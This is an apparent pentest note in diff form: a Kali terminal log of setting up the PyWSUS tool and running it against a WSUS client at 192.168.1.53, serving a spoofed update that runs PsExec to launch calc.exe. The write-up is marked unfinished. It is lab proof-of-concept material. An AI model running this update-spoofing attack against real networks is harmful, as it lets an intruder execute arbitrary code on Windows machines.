@@ -126,5 +126,87 @@ PoC 2 - Test using the tool PyWSUS
 
 => https://github.com/GoSecure/pywsus
 
+┌──(kali㉿kali)-[~/Documents]
+└─$ git clone https://github.com/GoSecure/pywsus.git     
+Cloning into 'pywsus'...
+remote: Enumerating objects: 122, done.
+remote: Counting objects: 100% (122/122), done.
+remote: Compressing objects: 100% (94/94), done.
+remote: Total 122 (delta 68), reused 64 (delta 28), pack-reused 0
+Receiving objects: 100% (122/122), 29.08 KiB | 1.62 MiB/s, done.
+Resolving deltas: 100% (68/68), done.
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/Documents]
+└─$ cd pywsus 
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/Documents/pywsus]
+└─$ ls            
+LICENSE  pywsus.py  README.md  requirements.txt  resources
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/Documents/pywsus]
+└─$ virtualenv -p /usr/bin/python3 ./venv
+created virtual environment CPython3.10.5.final.0-64 in 570ms
+  creator CPython3Posix(dest=/home/kali/Documents/pywsus/venv, clear=False, no_vcs_ignore=False, global=False)
+  seeder FromAppData(download=False, pip=bundle, setuptools=bundle, wheel=bundle, via=copy, app_data_dir=/home/kali/.local/share/virtualenv)
+    added seed packages: pip==22.2, setuptools==59.6.0, wheel==0.37.1
+  activators BashActivator,CShellActivator,FishActivator,NushellActivator,PowerShellActivator,PythonActivator
+                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~/Documents/pywsus]
+└─$ source ./venv/bin/activate
+                                                                                                                                                                                                                                           
+┌──(venv)─(kali㉿kali)-[~/Documents/pywsus]
+└─$ pip install -r ./requirements.txt
+Collecting beautifulsoup4==4.9.1
+  Downloading beautifulsoup4-4.9.1-py3-none-any.whl (115 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 115.1/115.1 kB 7.0 MB/s eta 0:00:00
+Collecting lxml==4.6.2
+  Downloading lxml-4.6.2.tar.gz (3.2 MB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 3.2/3.2 MB 20.5 MB/s eta 0:00:00
+  Preparing metadata (setup.py) ... error
+  error: subprocess-exited-with-error
+  
+  × python setup.py egg_info did not run successfully.
+  │ exit code: 1
+  ╰─> [3 lines of output]
+      Building lxml version 4.6.2.
+      Building without Cython.
+      Error: Please make sure the libxml2 and libxslt development packages are installed.
+      [end of output]
+  
+  note: This error originates from a subprocess, and is likely not a problem with pip.
+error: metadata-generation-failed
+
+× Encountered error while generating package metadata.
+╰─> See above for output.
+
+note: This is an issue with the package mentioned above, not pip.
+hint: See above for details.
+                                                                                                                                                                                                                                           
+┌──(venv)─(kali㉿kali)-[~/Documents/pywsus]
+└─$ ls
+LICENSE  pywsus.py  README.md  requirements.txt  resources  venv
+                                                                                                                                                                                                                                           
+┌──(venv)─(kali㉿kali)-[~/Documents/pywsus]
+└─$ ls resources                                                 
+get-authorization-cookie.xml  get-config.xml  get-cookie.xml  get-extended-update-info.xml  internal-error.xml  register-computer.xml  report-event-batch.xml  sync-updates.xml
+                                                                                                                                                                                                                                           
+┌──(venv)─(kali㉿kali)-[~/Documents/pywsus]
+└─$ cp ../wsuxploit/resources/PsExec.exe ./
+                                                                                                                                                                                                                                           
+┌──(venv)─(kali㉿kali)-[~/Documents/pywsus]
+└─$ ls          
+LICENSE  PsExec.exe  pywsus.py  README.md  requirements.txt  resources  venv
+                                                                                                                                                                                                                                           
+┌──(venv)─(kali㉿kali)-[~/Documents/pywsus]
+└─$ sudo python pywsus.py -H 192.168.1.53 -p 8530 -c '/accepteula /s calc.exe' -e PsExec64.exe
+usage: pywsus.py [-h] -H HOST [-p PORT] -e EXECUTABLE -c COMMAND [-v]
+pywsus.py: error: argument -e/--executable: can't open 'PsExec64.exe': [Errno 2] No such file or directory: 'PsExec64.exe'
+                                                                                                                                                                                                                                           
+┌──(venv)─(kali㉿kali)-[~/Documents/pywsus]
+└─$ sudo python pywsus.py -H 192.168.1.53 -p 8530 -c '/accepteula /s calc.exe' -e PsExec.exe  
+INFO:root:The update metadata - uuids: [UUID('aa9df3fa-fe86-4a61-b6ac-fbfac461abd5'), UUID('e75ddf1d-801b-4441-ba90-43acdba13a90')],revision_ids: [933334, 998376], deployment_ids: [90728, 98563], executable: PsExec.exe, sha1: 5Q2eO9kZCOE6JrPiPt6vV3+zoJU=, sha256: Mzfjh1sF4L+6aauSZTLj8Xnoz78WLrtgzligKBQ3p+8=
+INFO:root:Starting httpd...
+
+
 To complete...
 
